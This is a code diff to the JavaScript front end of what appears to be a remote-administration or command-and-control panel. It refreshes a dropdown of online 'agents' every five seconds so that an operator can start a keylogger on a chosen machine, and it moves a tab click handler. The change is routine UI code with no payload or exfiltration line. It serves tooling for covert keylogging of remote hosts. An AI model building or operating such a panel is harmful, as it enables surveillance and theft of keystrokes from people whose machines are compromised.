@@ -10,6 +10,7 @@ const TRANSFER_STATUS_KEY = 'fileTransferStatus';
 let keyloggerActive = false;
 let selectedAgent = null;
 let logUpdateInterval = null;
+let agents = {};
 
 function saveTransferStatus(status) {
     localStorage.setItem(TRANSFER_STATUS_KEY, JSON.stringify({
@@ -1048,21 +1049,47 @@ function updateAgentSelect() {
     const select = document.getElementById('keylogger-agent-select');
     if (!select) return;
 
+    // Store current selection
+    const currentSelection = select.value;
+
     // Clear current options except the first one
     while (select.options.length > 1) {
         select.remove(1);
     }
 
-    // Add online agents
-    Object.values(agents).forEach(agent => {
-        if (isAgentActive(agent.last_seen)) {
-            const option = document.createElement('option');
-            option.value = agent.id;
-            option.text = `Agent_${agent.id} (${agent.os_type || 'Unknown'})`;
-            select.add(option);
-        }
-    });
+    // Fetch latest agents data
+    fetch('/api/agents')
+        .then(response => response.json())
+        .then(data => {
+            agents = data;  // Update agents data
+            // Add online agents
+            Object.values(agents).forEach(agent => {
+                if (isAgentActive(agent.last_seen)) {
+                    const option = document.createElement('option');
+                    option.value = agent.id;
+                    option.text = `Agent_${agent.id} (${agent.os_type || 'Unknown'})`;
+                    select.add(option);
+                }
+            });
+
+            // Restore previous selection if agent still exists
+            if (currentSelection && select.querySelector(`option[value="${currentSelection}"]`)) {
+                select.value = currentSelection;
+            }
+        })
+        .catch(error => console.error('Error updating agent select:', error));
 }
+
+// Start periodic updates for keylogger agent list
+setInterval(updateAgentSelect, 5000);
+
+// Update agent select when switching to keylogger tab
+document.addEventListener('DOMContentLoaded', function() {
+    const keyloggerTab = document.querySelector('[data-tab="keylogger"]');
+    if (keyloggerTab) {
+        keyloggerTab.addEventListener('click', updateAgentSelect);
+    }
+});
 
 function startKeylogger() {
     const agentId = document.getElementById('keylogger-agent-select').value;
@@ -1234,7 +1261,4 @@ function fetchLatestLogs() {
         }
     })
     .catch(error => console.error('Error fetching logs:', error));
-}
-
-// Update agent select when switching to keylogger tab
-document.querySelector('[data-tab="keylogger"]').addEventListener('click', updateAgentSelect); 
+} 
